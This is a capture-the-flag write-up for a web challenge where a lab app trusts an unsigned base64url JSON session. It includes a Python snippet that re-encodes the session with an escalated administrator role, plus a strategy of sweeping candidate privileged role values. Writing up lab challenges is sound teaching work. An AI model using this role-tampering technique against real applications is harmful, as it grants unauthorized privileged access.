# 🌐 Serialized Offender

| | |
|---|---|
| **Day** | 20 (released on GM day 26) |
| **Lane** | 🌐 Web Exploitation |
| **Challenge ID** | `web-exploitation-day-20-serialized-offender` |
| **Modes** | Single Solve ✅ · Time Trial ✅ · Mastery ✅ |
| **Solver** | [`solvers/web/webrun.py`](../solvers/web/webrun.py) (`solve_deserialize`) |

## Prompt
> Your session is just a blob of misplaced trust. Reshape the bytes, sign nothing, and see what the app suddenly believes about you.

## TL;DR
An **insecure deserialization** of client-supplied session state. The session is a base64url-encoded JSON blob you send in full; the server deserializes it and trusts the `role` inside with no signature. Re-encode the sample with `role` escalated to admin.

## Artifact
No file; live target, proof `proof_<32 hex>`, answer id `proof-1` (mastery `proof-1..N`). Framework **Quarkus** (skin "Object Post"). `GET /api/clues`:

```json
{"framework": "Quarkus", "feature_route": "/process-<hex>",
 "state_format_route": "/api/state-format", "current_role": "analyst"}
```

`GET /api/state-format`:

```json
{"transport": "POST /process-<hex>", "content_type": "application/json",
 "request_field": "state", "encoding": "base64url of UTF-8 JSON",
 "sample_state": {"user": "analyst", "role": "analyst"}, "sample_encoded": "<b64url>"}
```

## Solution
The session is entirely client-supplied; `POST feature_route {"state": "<base64url of compact JSON>"}` is deserialized and the embedded `role` is trusted. Re-encode the sample with the role escalated:

```python
import base64, json
state = {"user": "analyst", "role": "administrator"}
blob = base64.urlsafe_b64encode(json.dumps(state, separators=(",",":")).encode()).rstrip(b"=").decode()
# POST feature_route {"state": blob}
```

→ `200 {"effect":"serialized_role_trusted","evidence":"proof_…"}`.

The accepted privileged value is randomized per variant — `admin` / `executive` / `superuser` / `root` / `owner` / `staff` and `is_admin:true` / `admin:true` all returned `role_not_permitted` for the observed variant — so `solve_deserialize` reads `request_field` + `sample_state` from the format route, escalates each role-ish key to each candidate in `_DESER_ROLES`, base64url-encodes compact JSON, and POSTs.

## Time Trial & Mastery
Played untimed via `run_for_time:false` (single omits it). Mastery bundles **4 sets**, types possibly mixed. `detect()` keys on the unique `state_format_route` and runs it **before** the feature-route block (Day 20 has a `feature_route` but no `secondary_route`).

## Lessons / gotchas
- "Sign nothing" is literal: the blob is unsigned, so re-encoding is all it takes — no gadget chain.
- Use the documented `sample_state` as the template and escalate only the role key; sweep candidate privileged values since the accepted one is randomized.
- Shared live-target and proof mechanics: [lane overview](../lanes/web.md).
